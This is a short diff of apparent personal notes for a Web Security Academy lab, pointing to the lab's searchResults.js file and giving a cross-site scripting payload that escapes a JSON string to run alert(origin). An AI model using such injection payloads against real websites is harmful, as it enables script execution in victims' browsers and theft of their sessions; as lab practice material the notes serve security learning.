@@ -1,0 +1,9 @@
+
+
+check this path for JS file:
+
+https://0a2e0094040954be81de70b8002000f6.web-security-academy.net/resources/js/searchResults.js
+
+
+
+1\"}; alert(origin);//
